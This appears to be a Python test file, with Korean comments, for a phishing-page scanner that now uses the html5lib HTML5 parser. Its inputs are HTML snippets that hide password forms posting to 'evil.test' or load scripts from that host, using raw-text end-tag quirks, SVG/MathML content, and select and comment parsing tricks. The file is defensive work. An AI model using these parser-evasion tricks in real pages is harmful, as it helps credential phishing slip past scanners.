"""HTML5 트리 빌더(html5lib)로 바꾼 뒤의 회귀 테스트. 5라운드까지 손으로 만든 파서가 브라우저와 갈렸던 유형과
Codex가 6라운드 도중 언급한 유형(원문 종료 태그, SVG, `select`의 암묵적 닫힘)을 브라우저 동작과 대조한다."""
import time

import pytest

from app import verdict as V

from .test_security_round3 import PAGE, _forms, _safe_ev
from .test_verdict import decide, page

from checklib import inspect_page as ip  # noqa: E402


def _verdict(html):
    r = ip.inspect_page(html.encode(), PAGE)
    if not r.get("ok"):
        return "page-failed"
    keys = ("forms", "apk_links", "js_redirect_hint", "external_active_domains")
    return decide(**_safe_ev(page={**page(), **{k: r[k] for k in keys}})).verdict


def _evil_form(r):
    return any(f["cross_domain"] and "password" in f["field_types"] for f in r["forms"])


# ── 원문 종료 태그 ────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("html", [
    '<textarea></textarea foo="x"><form action="https://evil.test"><input type=password></form>',
    '<textarea></TEXTAREA ><form action="https://evil.test"><input type=password></form>',
    '<title></title\n><form action="https://evil.test"><input type=password></form>',
    '<style></style x><form action="https://evil.test"><input type=password></form>',
    '<script></script foo><form action="https://evil.test"><input type=password></form>',
    '<xmp></xmp/><form action="https://evil.test"><input type=password></form>',
])
def test_raw_text_end_tags_with_attributes_or_odd_spacing_close_the_element(html):
    assert _evil_form(_forms(html)) and _verdict(html) != "safe"


def test_end_tag_lookalike_does_not_close_raw_text():
    r = _forms('<textarea></textareax><form action="https://evil.test"><input type=password></form></textarea>')
    assert not _evil_form(r)  # `</textareax>`는 종료 태그가 아니라 글자다


# ── SVG·외부 콘텐츠 ────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("html", [
    '<svg><script href="https://evil.test/a.js"></script></svg>',
    '<svg><script xlink:href="https://evil.test/a.js"></script></svg>',
    '<svg><foreignObject><script src="https://evil.test/a.js"></script></foreignObject></svg>',
    '<svg><![CDATA[<x>]]><script src="https://evil.test/a.js"></script></svg>',
    '<math><mtext><script src="https://evil.test/a.js"></script></mtext></math>',
])
def test_scripts_in_foreign_content_are_found(html):
    assert _forms(html)["external_active_domains"] == ["evil.test"] and _verdict(html) != "safe"


def test_form_in_svg_foreign_object_is_a_form():
    r = _forms('<svg><foreignObject><form action="https://evil.test"><input type=password></form></foreignObject></svg>')
    assert _evil_form(r)


# ── select의 암묵적 닫힘 ──────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("html", [
    '<select><input type=password><form action="https://evil.test"><input type=password></form>',
    '<form action="https://evil.test"><select><input type=password></form>',
])
def test_select_implicitly_closed_by_input_leaves_the_real_form_visible(html):
    r = _forms(html)
    assert any(f["cross_domain"] for f in r["forms"]) or _evil_form(r)
    assert _verdict(html) != "safe"


# ── 브라우저 대조: 5라운드까지 갈렸던 유형 ────────────────────────────────────────────────────────────
@pytest.mark.parametrize("html", [
    '<form id="f" /><input type=password><button formaction=https://evil.test>Go</button></form>',
    '<table><form action="https://evil.test"><input type=password></form></table>',
    '<form action="https://evil.test"><form action="/ok"><input type=password></form></form>',
    '<!--> <form action="https://evil.test"><input type=password></form>',
    '<!-- x --!> <form action="https://evil.test"><input type=password></form>',
    '<p><form action="https://evil.test"><input type=password></form>',
    "<form action=https://evil.test\n><input type=password></form>",
])
def test_form_ownership_follows_html5_tree_building(html):
    assert _verdict(html) != "safe"


def test_inert_tokens_in_text_elements_do_not_change_document_state():
    r = _forms("<textarea><base href=https://hanbit.example/></textarea><base href=https://evil.test/>"
               "<form action=/collect><input type=password></form>")
    assert _evil_form(r)


def test_documents_with_template_are_never_safe():
    assert _verdict("<template><p>x</p></template><p>ok</p>") != "safe"
    assert "(unmodeled)" in _forms("<template></template>")["external_active_domains"]


def test_plain_page_still_safe_with_html5lib():
    assert _verdict("<html><head><title>한빛택배</title></head><body><p>hello</p>"
                    "<form action='/login'><input name=id><input type=password></form></body></html>") == "safe"


# ── 자원·실패 처리 ─────────────────────────────────────────────────────────────────────────────────
def test_hostile_nesting_hits_the_time_or_size_limit_instead_of_hanging():
    t0 = time.time()
    r = ip.inspect_page(("<b>" * 100_000 + "x").encode(), PAGE)
    assert time.time() - t0 < 15
    assert r["ok"] is False and r["error"] in ("parse timeout", "too many tags")


def test_too_many_tags_is_an_analysis_failure_not_a_pass():
    r = ip.inspect_page(("<i></i>" * 100_000).encode(), PAGE)
    assert r == {"ok": False, "error": "too many tags"}
    assert V.verification_gaps(V.Evidence(**_safe_ev(page=r)))  # 페이지 분석 실패는 안전 판정 불가


def test_missing_html5lib_fails_closed(monkeypatch):
    import builtins

    real = builtins.__import__

    def fake(name, *a, **k):
        if name == "html5lib":
            raise ImportError("no html5lib")
        return real(name, *a, **k)

    monkeypatch.setattr(builtins, "__import__", fake)
    r = ip.inspect_page(b"<p>ok</p>", PAGE)
    assert r == {"ok": False, "error": "html5lib missing"}


def test_deep_nesting_is_handled_iteratively():
    r = ip.inspect_page(("<div>" * 3000 + "<form action='https://evil.test'><input type=password></form>").encode(), PAGE)
    assert r["ok"] and _evil_form(r)


def test_form_start_tag_inside_select_is_ignored_by_browsers_too():
    r = _forms('<select><option>a<form action="https://evil.test"></select><input type=password></form>')
    assert not any(f["cross_domain"] for f in r["forms"])  # 브라우저도 이 form을 만들지 않는다
